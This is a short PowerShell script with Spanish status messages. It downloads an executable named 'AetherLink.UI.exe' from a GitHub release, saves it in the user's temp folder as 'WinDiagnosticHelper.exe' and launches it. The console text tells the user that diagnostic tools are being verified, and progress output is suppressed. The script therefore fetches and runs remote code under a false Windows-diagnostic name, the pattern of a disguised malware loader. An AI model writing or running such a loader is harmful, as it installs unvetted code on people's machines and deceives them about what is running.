$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"
$tempDir = "$env:TEMP\WinDiagCache"
$appExe = "$tempDir\WinDiagnosticHelper.exe"
$appTmp = "$tempDir\WinDiagnosticHelper.tmp"
$versionFile = "$tempDir\version.txt"
$appUrl = "https://github.com/DanielWueno/AetherLink/releases/download/Android_Only/AetherLink.UI.exe"
$apiUrl = "https://api.github.com/repos/DanielWueno/AetherLink/releases/latest"

$needsDownload = $true

if (Test-Path $appExe) {
    try {
        $latestRelease = Invoke-RestMethod -Uri $apiUrl -TimeoutSec 5
        $latestTag = $latestRelease.tag_name
        
        if (Test-Path $versionFile) {
            $cachedTag = Get-Content -Path $versionFile -Raw
            if ($cachedTag -eq $latestTag) {
                $needsDownload = $false
            }
        }
    } catch {
        $needsDownload = $false
    }
}

if ($needsDownload) {
    Write-Host "Sincronizando binarios en la caché temporal. Por favor espera..." -ForegroundColor DarkGray
    New-Item -ItemType Directory -Force -Path $tempDir | Out-Null
    Invoke-WebRequest -Uri $appUrl -OutFile $appTmp
    if (Test-Path $appExe) { Remove-Item -Path $appExe -Force }
    Rename-Item -Path $appTmp -NewName "WinDiagnosticHelper.exe"
    
    if ($latestTag) {
        $latestTag | Out-File -FilePath $versionFile -Force -NoNewline
    }
} else {
    Write-Host "Verificando herramientas de diagnóstico... (OK)" -ForegroundColor DarkGray
}

Write-Host "Lanzando entorno gráfico en segundo plano..." -ForegroundColor DarkGray
Start-Process -FilePath $appExe

Write-Host "Listo. Ya puedes cerrar esta consola." -ForegroundColor Green
Start-Sleep -Seconds 2
